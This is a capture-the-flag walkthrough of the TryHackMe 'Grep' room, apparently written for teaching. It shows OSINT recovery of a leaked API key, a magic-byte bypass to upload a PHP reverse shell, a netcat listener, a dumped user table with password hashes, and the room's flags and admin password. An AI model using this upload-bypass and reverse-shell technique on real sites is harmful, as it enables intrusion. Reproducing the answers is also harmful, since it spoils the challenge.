# Grep

[Link to room](https://tryhackme.com/room/greprtp)

## Task 1: Grep

### 1. What is the API key that allows a user to register on the website?

Let's start by performing a nmap scan.

```
sudo nmap -n -A -Pn --min-parallelism 100 -T5 -p- 10.10.76.116
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 23:59 EDT
Warning: 10.10.76.116 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.76.116
Host is up (0.21s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:74:00:e9:6e:77:43:e3:3a:28:c5:41:45:af:9f:08 (RSA)
|   256 7c:0d:70:d9:df:24:4d:aa:c4:df:77:5f:04:a3:b7:33 (ECDSA)
|_  256 c3:f5:4f:ae:a4:59:f5:45:ff:8e:a0:b5:0b:5a:3b:76 (ED25519)
80/tcp    open     http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp   open     ssl/http Apache httpd 2.4.41
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2023-06-14T13:03:09
|_Not valid after:  2024-06-13T13:03:09
29249/tcp filtered unknown
46721/tcp filtered unknown
51337/tcp open     http     Apache httpd 2.4.41
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.41 (Ubuntu)
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: ip-10-10-76-116.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   221.95 ms 10.8.0.1
2   218.38 ms 10.10.76.116

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 219.57 seconds
```

From the nmap results, notice that both http and https ports are opened. There is also a much higher port 51337 for http.

However, if you navigate to the https site, you will get a message saying "You don't have permission".

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/2596dd2a-81c2-4c23-b561-c1a435ca6c7e)

To overcome this, we must modify our host file at `/etc/hosts/`.

Using `nano` or any other text editor of your choice with administrative privilege, modify the hosts file by adding your machine IP address and `grep.thm`.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/3fb3e9d0-6222-43de-8b9e-d6a2575aecbd)

Now, head on to `grep.thm` and you can see the site. 

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/639e63f1-fd04-4a00-8217-0ffb9a3ad058)

Click on `Register` to register an account.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/205cbc44-bc82-4a4c-b228-f199af06d140)

As suggested in the question itself, we are unable to register an account just yet.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/b92edce6-84d2-48a7-a86b-9e28baec0184)

This room is an OSINT challenge, so we need to perform some OSINT now. If you noticed from the home page, this room is under development. Most developers use GitHub to develop and store their websites.

Hence, we will search on GitHub to see if there's any luck. To narrow down our search, we need to search for the term "SearchME" and specify the language as `PHP`.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/2da03e31-3b05-4638-9f45-519e3ab19adf)

The first result itself caught my eye. We will go ahead and click on it.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/52eda1dd-c0a8-4c4e-9d85-492dc43b054d)

Notice that there's an `API` folder. Let's navigate inside.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/c5e1929b-2be6-448d-b574-045b79a6977d)

From here, we can see that there are two files. We will examine both of the files.

Interestingly, the `register.php` has the last commit's message of `Fix: remove key`. Hence, we need to view the initial commits to see if we can get the API.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/df5717a3-d330-4cef-b9c6-3f73330623a7)

From the initial commits, we can get the API key.

> ffe60ecaa8bba2f12b43d1a4b15b8f39

# 2. What is the first flag?

The next step is to use the API key and register an account. To achieve this, we will use `Burp Suite` to intercept the packet and modify the API key.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/3c7705dd-77a2-4806-8d5d-e180ec8ce8a7)

As expected, we successfully created our account. 

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/46db6065-8164-456a-b00d-c5f8f0a28130)

Let's proceed to log in.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/d1af5851-3158-4c55-a6f1-687f435869aa)

Once we log in, we will be able to get our first flag.

> THM{4ec9806d7e1350270dc402ba870ccebb}

# 3. What is the email of the "admin" user?

I have checked through the website and found nothing else to move forward. However, remember that in GitHub, there's another file `upload.php`?

Let's try to navigate to that site.

`https://grep.thm/public/html/upload.php`

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/449f8180-3f07-47ef-9170-f421e3da5941)

We can see that it is a page that allows us to upload a file. Since this website is developed using PHP, we will try to upload a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/6f303d2e-4ed6-4b8d-a681-ad555c6c9c39)

We will get this message saying that only JPG, JPEG, PNG, and BMP files are allowed. 

Now, let's examine the source code of the `upload.php`. 

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/678f8275-69fd-4099-9d96-79bb21222b8a)

We can see that the upload page is checking the file type using the file signatures header or magic bytes. 

To overcome that, we will modify our `phpreverseshell` file by inserting the file signatures header of a `jpg` file.

Insert `FF D8 FF E0 00 10 4A 46` to the beginning of the file and let's try to upload now.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/5b28f787-aa35-479d-a022-31bb83dc5331)

Our upload is successful. Now we will need to open a netcat listener and open that file from the browser to get our reverse shell.

`nc -lvnp 1234`

To find the file that we uploaded, we will check the directory `/api/uploads`. This information is obtained from the `upload.php` source code earlier.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/a9ff5515-1404-463d-b60f-7aff8f44ea58)

Click on the phpreveseshell and we will get our reverse shell. 

Note: Make sure you have started the NetCat listener and it is listening on the correct port. Also, make sure you have modified the IP address in your phpreverseshell.

```
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.179.170] from (UNKNOWN) [10.10.78.59] 34674
Linux ip-10-10-78-59 5.15.0-1038-aws #43~20.04.1-Ubuntu SMP Fri Jun 2 17:10:57 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 02:22:25 up 38 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

We will be able to find the email of the admin at the sql dump.

`cat /var/www/backup/users.sql`

```
$ cat /var/www/backup/users.sql
-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: May 30, 2023 at 01:25 PM
-- Server version: 10.4.28-MariaDB
-- PHP Version: 8.0.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `postman`
--

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email` varchar(100) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `role` varchar(20) DEFAULT 'user'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`),
  ADD UNIQUE KEY `email` (`email`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
```

> admin@searchme2023cms.grep.thm

## 4. What is the host name of the web application that allows a user to check an email for a possible password leak?

```
$ cd /var/www
$ ls
backup
certificate.crt
certificate.csr
default_html
html
leak_certificate.crt
leak_certificate.csr
leakchecker
private.key
private_unencrypted.key
$ cd leakchecker
$ ls
check_email.php
index.php
```

If we navigate to the directory storing the website files, we can see that there is apparently another website hosted on the same server.

Open that folder and we can see there's a `check_email.php` file. I believe this is the website the question mentioned. Hence, add `leakchecker` as the subdomain.

> leakchecker.grep.thm

# 6. What is the password of the "admin" user?

Let's add `leakcheaker.grep.thm` to the hosts file like how we did in the previous steps.

Then, let's try to access the website.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/ad8fe3be-087d-4ae9-9fe4-6a9b71c51ac8)

We can't access the website just yet.

Referring to the nmap results we got earlier, there's another port opened which is 51337. Let's try to use that port.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/0408d846-1351-4a7f-9a16-e867149fdd65)

Boom! We are able to visit this website. For the final step, just insert the admin email address obtained earlier and get the final answer.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/9ebfff2e-8c65-400e-a677-eb9876ad127e)

> admin_tryhackme!
